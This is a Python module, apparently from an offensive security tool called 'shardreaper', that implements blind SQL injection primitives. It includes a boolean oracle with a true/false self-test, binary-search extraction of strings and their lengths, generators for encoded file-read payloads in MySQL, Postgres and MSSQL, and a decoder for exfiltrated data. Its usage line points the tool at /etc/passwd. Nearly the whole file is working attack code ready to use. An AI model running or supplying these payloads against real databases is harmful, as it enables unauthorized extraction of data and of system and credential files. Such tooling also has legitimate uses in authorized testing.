#!/usr/bin/env python3
"""
sqli.py — SQLi primitives that do not lie to you.

Post-Cobblestone lessons 1/2/5/6, implemented in code:

  * Oracle self-test  — known-true vs known-false BEFORE any extraction.
    A silent all-false oracle is the difference between "admin doesn't
    exist" and a working user enumeration.
  * Encoded exfil     — file reads are generated base64/hex-encoded and
    decoded locally. Raw content is never regex-parsed out of HTML.
  * String extraction — binary-search per character with length first.
  * Magic variants    — PoC magic values are tried in every type form
    (str, int, hex, float, negative).
"""
import json
import re


def variants(value):
    """Every plausible literal form of a magic value — try them all."""
    out = []
    for v in (value, str(value), json.dumps(value) if not isinstance(value, str) else None):
        if v is not None:
            out.append(v)
    if isinstance(value, str):
        try:
            iv = int(value, 0)
            out += [iv, hex(iv), str(iv), float(iv)]
        except (ValueError, TypeError):
            pass
    elif isinstance(value, bool):
        out += [1, 0, "1", "0", "true", "false"]
    elif isinstance(value, int):
        out += [hex(value), float(value), str(value), value]
    return list(dict.fromkeys(out))


class Oracle:
    """A boolean SQLi oracle: probe(condition_str) -> bool.

    probe: callable taking a SQL condition string (e.g. "1=1") and
    returning a response; check() interprets that response as True/False.
    """

    def __init__(self, probe, check=None):
        self.probe = probe
        self.check = check or bool
        self._true = None
        self._false = None
        self._ok = None

    def validate(self):
        """Run the known-true / known-false self-test. Never skip this."""
        t = self.probe("1=1")
        f = self.probe("1=2")
        self._true, self._false = self.check(t), self.check(f)
        self._ok = self._true is True and self._false is False
        return {
            "ok": self._ok,
            "true_cond_evaluates": self._true,
            "false_cond_evaluates": self._false,
            "note": ("oracle verified — differential responses confirmed"
                     if self._ok else
                     "ORACLE BROKEN: both conditions evaluate the same — "
                     "your probe or interpretation is wrong; fix it before "
                     "extracting anything (post-Cobblestone lesson 5)"),
        }

    def test(self, condition):
        """One oracle call; requires validate() first."""
        if self._ok is None:
            raise RuntimeError("oracle not validated — run validate() first")
        return self.check(self.probe(condition))

    def extract_char(self, expr, index, lo=32, hi=126):
        """Binary-search one character of expr at SQL index (1-based)."""
        idx = int(index)
        while lo <= hi:
            mid = (lo + hi) // 2
            if self.test(f"ASCII(SUBSTRING(({expr}),{idx},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid - 1
        return chr(lo)

    def extract_string(self, expr, max_len=64):
        """Extract expr: length first (binary search), then per-char."""
        n = self._find_length(expr, max_len)
        return "".join(self.extract_char(expr, i) for i in range(1, n + 1))

    def _find_length(self, expr, start):
        lo, hi = 0, start
        while not self.test(f"LENGTH(({expr}))<={hi}"):
            lo, hi = hi, hi * 4
            if hi > 65536:
                return hi
        while lo < hi:
            mid = (lo + hi) // 2
            if self.test(f"LENGTH(({expr}))<={mid}"):
                hi = mid
            else:
                lo = mid + 1
        return lo


# ---------------- encoded file-read payloads ----------------
def file_read_payload(dialect, path, encoding="base64"):
    """SQL that reads a file ENCODED — never raw (post-Cobblestone lesson 1)."""
    p = path.replace("'", "\\'")
    if dialect == "mysql":
        if encoding == "hex":
            return f"SELECT HEX(LOAD_FILE('{p}'))"
        return f"SELECT TO_BASE64(LOAD_FILE('{p}'))"
    if dialect == "postgres":
        return f"SELECT encode(pg_read_file('{p}')::bytea, 'base64')"
    if dialect == "mssql":
        return (f"SELECT CAST((SELECT BulkColumn FROM OPENROWSET(BULK '{p}', "
                f"SINGLE_BLOB) AS x) AS VARBINARY(MAX)) FOR XML PATH('')")
    raise ValueError(f"unknown dialect {dialect}")


_MARKERS = [
    (r"(?:0x)?([0-9a-fA-F]{8,})", "hex"),
    (r"([A-Za-z0-9+/]{40,}={0,2})", "base64"),
]


def decode_exfil(text):
    """Decode an exfiltrated blob: base64 first, then hex. Returns (bytes, how)."""
    if not text:
        return b"", "empty"
    t = re.sub(r"<[^>]+>", " ", text)          # drop accidental markup
    t = re.sub(r"[\s\r\n]+", "", t)            # transport usually wraps lines
    for rx, how in _MARKERS:
        m = re.search(rx, t)
        if not m:
            continue
        blob = m.group(1)
        try:
            if how == "base64":
                import base64
                raw = base64.b64decode(blob + "=" * (-len(blob) % 4))
                if raw and (len(raw) > 4 or b" " in raw or raw.isprintable()):
                    return raw, how
            else:
                raw = bytes.fromhex(blob)
                if raw:
                    return raw, how
        except Exception:
            continue
    return text.encode("utf-8", errors="replace"), "raw-fallback"


def cli_sqli(args):
    print(f"variants({args.value!r}):")
    for v in variants(args.value):
        print(f"  {type(v).__name__:8s} {v!r}")
    print()
    if args.decode:
        try:
            data = open(args.decode, "rb").read().decode("utf-8", errors="ignore")
        except OSError as e:
            print(f"cannot read {args.decode}: {e}")
            return 1
        raw, how = decode_exfil(data)
        print(f"decoded ({how}): {len(raw)} bytes")
        print(raw.decode("utf-8", errors="replace")[:2000])
    return 0


def build_arg_parser(sub):
    p = sub.add_parser("sqli", help="SQLi primitives: oracle self-test tools, "
                        "encoded file-read payloads, exfil decoding, magic variants")
    p.add_argument("value", nargs="?", default=None, help="show type variants of a magic value")
    p.add_argument("--decode", default=None, help="decode an encoded exfil blob file")
    p.add_argument("--file-read", nargs=2, metavar=("DIALECT", "PATH"),
                   help="print an ENCODED file-read payload for mysql/postgres/mssql")
    p.set_defaults(fn=cli_sqli_run)
    return p


def cli_sqli_run(args):
    if args.file_read:
        dialect, path = args.file_read
        try:
            print(file_read_payload(dialect, path))
        except ValueError as e:
            print(f"error: {e}")
            return 1
        return 0
    if args.value is None:
        print("usage: shardreaper sqli <magic-value> | --file-read mysql /etc/passwd "
              "| --decode blob.txt")
        return 1
    return cli_sqli(args)
